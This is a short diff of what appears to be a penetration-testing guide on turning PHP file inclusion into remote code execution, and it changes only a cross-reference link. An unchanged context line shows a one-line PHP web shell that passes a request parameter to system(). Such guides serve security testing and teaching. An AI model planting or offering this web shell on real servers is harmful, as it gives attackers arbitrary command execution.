@@ -86,8 +86,8 @@ As code execution functions can be filtered, the phpinfo testing phase is requir
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
-{% content-ref url="lfi-to-rce/" %}
-[lfi-to-rce](lfi-to-rce/)
+{% content-ref url="lfi-to-rce.md" %}
+[lfi-to-rce.md](lfi-to-rce.md)
 {% endcontent-ref %}
 
 {% content-ref url="rfi-to-rce.md" %}
